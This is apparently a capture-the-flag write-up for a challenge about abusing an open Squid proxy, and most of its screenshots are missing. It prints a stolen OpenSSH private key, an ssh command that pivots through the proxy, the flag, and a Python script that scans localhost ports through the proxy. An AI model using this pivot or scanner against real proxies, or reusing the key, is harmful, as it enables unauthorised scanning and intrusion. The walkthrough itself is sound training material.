# 2024-10-18 Permissions To Proxy (Miscellaneous)

*[image unavailable]*

*[image unavailable]*

Trying to scan back at 172.0.01 through the proxy, nmap wasn't working well with squid, there is a script at the bottom that was faster and showed the ports.

*[image unavailable]*

*[image unavailable]*

*[image unavailable]*

*[image unavailable]*

This is better results

*[image unavailable]*

*[image unavailable]*

*[image unavailable]*

We could get the directory with a GET here, now for a foothold or shell.

*[image unavailable]*

*[image unavailable]*

Can't just cat the flag, not root.

*[image unavailable]*

Grabbed the ssh keys here

*[image unavailable]*

*[image unavailable]*

```bash
-----BEGIN OPENSSH PRIVATE KEY-----
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
JauN0ipko/W2sAAAAJa2FsaUBrYWxpAQI=
-----END OPENSSH PRIVATE KEY-----
```

Other interesting exposted file

*[image unavailable]*

```python
ssh -i id_rsa user@127.0.0.1 -o "ProxyCommand=connect-proxy -H challenge.ctf.games:30114 %h %p"
```

Okay shell but it's wonky.

*[image unavailable]*

Trying to find access

*[image unavailable]*

```python
flag{c9bbd4888086111e9f632d4861c103f1}
```

*[image unavailable]*

Other faster script for scanning

```python
import aiohttp
import asyncio

# Proxy details
proxy_address = "http://challenge.ctf.games:32107"

# Target IP and base port to scan
target_ip = "127.0.0.1"

# Logging file to store results
log_file = "curl_scan_results_async.log"
# Starting and ending port range
start_port = 49000
end_port = 65535

# Number of concurrent connections (tweak this based on your system's limits)
max_connections = 3

# Function to perform an asynchronous HTTP request
async def curl_request(session, port):
    url = f"http://{target_ip}:{port}"

    try:
        # Perform the asynchronous HTTP request using aiohttp with a proxy
        async with session.get(url, proxy=proxy_address, timeout=5) as response:
            if response.status == 200:
                with open(log_file, "a") as log:
                    log.write(f"Open service found on {url}\n")
                print(f"Open service found on {url}")
    except Exception as e:
        with open(log_file, "a") as log:
            log.write(f"Error connecting to {url}: {e}\n")
        print(f"Error connecting to {url}: {e}")

# Function to manage asynchronous port scanning
async def scan_ports_concurrently():
    connector = aiohttp.TCPConnector(limit_per_host=max_connections)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [curl_request(session, port) for port in range(start_port, end_port + 1)]
        await asyncio.gather(*tasks)

# Main function to run the async event loop
if __name__ == "__main__":
    asyncio.run(scan_ports_concurrently())
    print(f"Scan complete. Results stored in {log_file}.")
```
